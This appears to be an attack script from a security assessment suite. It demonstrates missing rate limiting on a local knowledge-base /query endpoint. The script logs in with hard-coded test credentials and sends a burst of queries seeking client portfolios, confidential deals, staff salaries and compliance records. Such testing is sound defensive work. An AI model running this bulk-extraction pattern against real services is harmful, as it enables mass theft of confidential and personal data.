"""
attack_04_bulk_extraction.py
============================
Demonstrates that a single authenticated user can hammer the /query endpoint
with no rate limiting — enabling systematic knowledge base extraction.

Run: python security_assessment/attacks/attack_04_bulk_extraction.py <token>
"""

import sys
import time
import httpx

BASE_URL = "http://localhost:8000"

# Topics an attacker would iterate through to extract the full knowledge base
EXTRACTION_QUERIES = [
    "List all client names and their portfolio values",
    "What are the current fund NAV figures?",
    "Show all merger and acquisition targets",
    "What confidential deals are currently in progress?",
    "List all restricted documents and their contents",
    "What are the internal risk ratings for each client?",
    "Show all compliance violations recorded",
    "What are the salary and bonus figures for staff?",
    "List all upcoming IPO details",
    "What are the internal price targets for equities?",
]


def get_token() -> str | None:
    if len(sys.argv) > 1:
        return sys.argv[1]
    resp = httpx.post(
        f"{BASE_URL}/api/v1/auth/token",
        data={"username": "adviser@test.com", "password": "password123"},
    )
    if resp.status_code == 200:
        return resp.json()["access_token"]
    print(f"[!] Auth failed. Pass a valid token as argument.")
    return None


def run():
    print("=" * 60)
    print("ATTACK 04 — Bulk Knowledge Base Extraction (No Rate Limit)")
    print("=" * 60)

    token = get_token()
    if not token:
        sys.exit(1)

    headers = {"Authorization": f"Bearer {token}"}
    results = []
    start = time.time()

    print(f"\n[*] Firing {len(EXTRACTION_QUERIES)} queries with no delay...\n")

    for i, query in enumerate(EXTRACTION_QUERIES, 1):
        t0 = time.time()
        resp = httpx.post(
            f"{BASE_URL}/api/v1/query",
            headers=headers,
            json={"query": query},
            timeout=30,
        )
        elapsed = time.time() - t0

        if resp.status_code == 200:
            body = resp.json()
            not_found = body.get("not_found", True)
            answer = body.get("answer", "")[:150]
            sources = body.get("sources", [])
            status = "📄 GOT DATA" if not not_found else "— No content"
            print(f"  [{i:02d}] {status} | {elapsed:.1f}s | sources={len(sources)}")
            print(f"        Q: {query[:60]}")
            if not not_found:
                print(f"        A: {answer}")
            results.append({"query": query, "got_data": not not_found, "sources": sources})
        elif resp.status_code == 429:
            print(f"  [{i:02d}] 🛡  RATE LIMITED (429) — attack blocked")
            break
        else:
            print(f"  [{i:02d}] HTTP {resp.status_code} — {resp.text[:100]}")

    total = time.time() - start
    hits = sum(1 for r in results if r["got_data"])

    print(f"\n{'=' * 60}")
    print(f"RESULT: {hits}/{len(results)} queries returned data in {total:.1f}s")
    print(f"  No rate limiting encountered — all {len(results)} requests went through.")
    print(f"  A real attacker could run thousands of queries to map the entire KB.")
    print("=" * 60)


if __name__ == "__main__":
    run()
